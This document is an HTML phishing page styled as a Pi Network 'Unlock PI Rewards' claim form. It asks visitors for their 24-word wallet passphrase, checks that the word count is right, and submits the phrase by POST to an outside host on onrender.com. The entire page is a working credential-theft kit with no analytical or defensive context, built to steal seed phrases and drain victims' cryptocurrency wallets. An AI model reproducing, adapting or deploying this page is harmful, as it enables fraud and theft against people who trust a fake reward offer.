<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Unlock PI Rewards</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .container {
            text-align: center;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
            width: 90%;
            max-width: 400px;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            background-color: #007BFF;
            color: white;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .error {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
        }
    </style>
    <script>
        function validatePassphrase() {
            const passphrase = document.getElementById("passphrase").value.trim();
            const errorMessage = document.getElementById("error-message");
            const wordCount = passphrase.split(" ").filter(word => word).length;

            if (wordCount !== 24) {
                errorMessage.textContent = "Please enter a valid 24-word passphrase.";
                return false;
            }
            errorMessage.textContent = "";
            return true;
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Unlock PI Rewards</h1>
        <div id="error-message" class="error"></div>
        <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
            <input type="text" id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase">
            <button type="submit">Unlock PI Reward</button>
        </form>
    </div>
</body>
</html>
